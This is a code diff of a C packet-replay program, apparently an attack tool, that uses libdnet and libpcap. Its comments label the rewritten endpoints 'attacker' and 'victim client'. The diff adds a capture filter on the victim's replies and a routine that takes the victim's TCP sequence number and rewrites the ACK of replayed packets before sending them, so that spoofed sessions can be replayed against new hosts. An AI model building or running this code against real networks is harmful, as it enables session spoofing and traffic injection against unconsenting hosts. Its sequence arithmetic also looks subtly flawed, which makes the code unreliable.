@@ -6,6 +6,8 @@
 #include <fcntl.h>
 #include <string.h>
 
+#define CMD " tcp and dst host %s and src host %s"
+
 /* AUTHOR SELF NOTES FOR USING LIBDNET:
  * uint8 can be called normally.
  * uint16 requires ntohs
@@ -15,7 +17,9 @@
 // PROTOTYPES FOLLOW:
 void usage(void);
 void open_devices(void);
+void setfilter();
 void rmnl(char *s);
+void proc_Seq(unsigned char *user, struct pcap_pkthdr *h, unsigned char *pack );
 void proc_pkt(const unsigned char *pack);
 int load_address(FILE *fp, char *ip, char *hw,struct addr *ad, struct addr *ha);
 void readcfg(char *filename);
@@ -30,7 +34,7 @@ char revIP[32], revMac[32];       // replay ascii ip and mac addresses
 char timing[32];
 char lvPort[10], laPort[10], reaPort[10], revPort[10];
 int locPort, remPort;
-
+unsigned int newAck = 0;
 
 
 
@@ -68,10 +72,13 @@ int b_usec = 0;
 int fd;
 int sending;
 int err;
+int initpkt = 0;
 
 intf_t *i;
 eth_t *e;
 pcap_t *p;
+struct bpf_program fcode;
+uint32_t localnet, netmask;
 char *cfile;
 
 int main(int argc, char **argv) {
@@ -92,6 +99,7 @@ int main(int argc, char **argv) {
 
     readcfg(cfile);
     open_devices();
+    setfilter();
 
     fd = open(logfile, O_RDONLY);
     if (fd == -1) {
@@ -183,6 +191,26 @@ int load_address(FILE *fp, char *ip, char *hw,struct addr *ad, struct addr *ha) 
   return(0);
 }
 
+// Set the bpf filter to only accept tcp packets from the clients
+// to this machine.
+void setfilter() {
+  char cmd[128];
+  if ( pcap_lookupnet(iface, &localnet, &netmask, ebuf) < 0 ) {
+    fprintf(stderr,"pcap_lookupnet: %s\n", ebuf);
+    exit(-1);
+  }
+  snprintf(cmd, sizeof(cmd), CMD, reaIP, revIP);
+  printf("Filter:%s\n",cmd);
+  if ( pcap_compile(p, &fcode, cmd, 0, netmask) < 0 ) {
+    fprintf(stderr,"pcap_compile: %s\n", pcap_geterr(p));
+    exit(-1);
+  }
+  if ( pcap_setfilter(p, &fcode) < 0 ) {
+    fprintf(stderr,"pcap_setfilter: %s\n", pcap_geterr(p));
+    exit(-1);
+  }
+}
+
 // Replace newline with null character
 void rmnl(char *s) {
   while ( *s != '\n' && *s != '\0' )
@@ -262,6 +290,29 @@ void open_devices(void) {
     }
 }
 
+// Get seq number from host packet
+void proc_Seq(unsigned char *user, struct pcap_pkthdr *h, unsigned char *pack ){
+    // victim response packet headers
+    struct eth_hdr *eth_hdr;
+    struct ip_hdr *ip_hdr;
+    struct tcp_hdr *tcp_hdr;
+    eth_hdr = (struct eth_hdr *)pack;
+    ip_hdr = (struct ip_hdr *)(pack + ETH_HDR_LEN);
+    tcp_hdr = (struct tcp_hdr *)(pack + ETH_HDR_LEN + IP_HDR_LEN);
+    
+    // If we haven't threeway-handshake'd, find init Ack
+    if (newAck == 0){
+        newAck = ntohl(tcp_hdr->th_seq);
+        newAck++;
+        return;
+    }
+    // Else just use the len for the ack
+    else {
+        newAck = newAck + ntohl(ip_hdr->ip_len);
+        return;
+    }
+}
+
 // Proccess packet for retransmission or discard
 void proc_pkt(const unsigned char *pack) {
     struct addr addr;
@@ -324,25 +375,43 @@ void proc_pkt(const unsigned char *pack) {
             printf("\t   Ack = %u\n", ntohl(tcp_hdr->th_ack));
 
             // Replace source address with attacker address and port
-            memcpy( &eth_hdr->eth_src, &reaMac, ETH_ADDR_LEN);
-            memcpy( &ip_hdr->ip_src, &reaIP, IP_ADDR_LEN);
-            
-            // Replace destination address with new victim client and port
-            memcpy( &eth_hdr->eth_dst, &remoteMac, ETH_ADDR_LEN);
-            memcpy( &ip_hdr->ip_dst, &remoteIP, IP_ADDR_LEN);
-            
+            memcpy( &eth_hdr->eth_src, &localMac.addr_eth, ETH_ADDR_LEN);
+            memcpy( &ip_hdr->ip_src, &localIP.addr_ip, IP_ADDR_LEN);
 
-            // Compute both ip and tcp checksums
-            ip_checksum((void *)ip_hdr, ntohs(ip_hdr->ip_len));
+            // Replace destination address with new victim client and port
+            memcpy( &eth_hdr->eth_dst, &remoteMac.addr_eth, ETH_ADDR_LEN);
+            memcpy( &ip_hdr->ip_dst, &remoteIP.addr_ip, IP_ADDR_LEN);
             
             if(sending == 1){
                 // Send packet
                 if(strcmp(timing, "delay") == 0)
                     usleep(500);
-                n = eth_send(e,pack,pkthdr.len);
-                if ( n != pkthdr.len ) {
-                    fprintf(stderr,"Partial packet transmission %d/%d\n",n,pkthdr.len);
+                if(initpkt == 1){
+                    if ( pcap_loop(p, 1, (pcap_handler)proc_Seq, (unsigned char *)NULL) < 0 ) {
+                        fprintf(stderr, "%s: pcap_loop: %s\n", "proxy", pcap_geterr(p));
+                        return;
                     }
+                    tcp_hdr->th_ack = htonl(newAck);
+                    printf("\t   New Ack = %u\n", ntohl(tcp_hdr->th_ack));
+                    // Compute both ip and tcp checksums
+                    ip_checksum((void *)ip_hdr, ntohs(ip_hdr->ip_len));
+                    n = eth_send(e,pack,pkthdr.len);
+                    if ( n != pkthdr.len ) {
+                        fprintf(stderr,"Partial packet transmission %d/%d\n",n,pkthdr.len);
+                    }
+                    printf("\n\t   Packet Sent!\n");
+                }
+                else {
+                    // Compute both ip and tcp checksums
+                    printf("\t   New Ack = %u\n", ntohl(tcp_hdr->th_ack));
+                    ip_checksum((void *)ip_hdr, ntohs(ip_hdr->ip_len));
+                    n = eth_send(e,pack,pkthdr.len);
+                    initpkt++;
+                    if ( n != pkthdr.len ) {
+                        fprintf(stderr,"Partial packet transmission %d/%d\n",n,pkthdr.len);
+                       }
+                    printf("\n\t   Packet Sent!\n");
+                }
             }
             else {
                 printf("\n\t   Packet Not Sent\n");
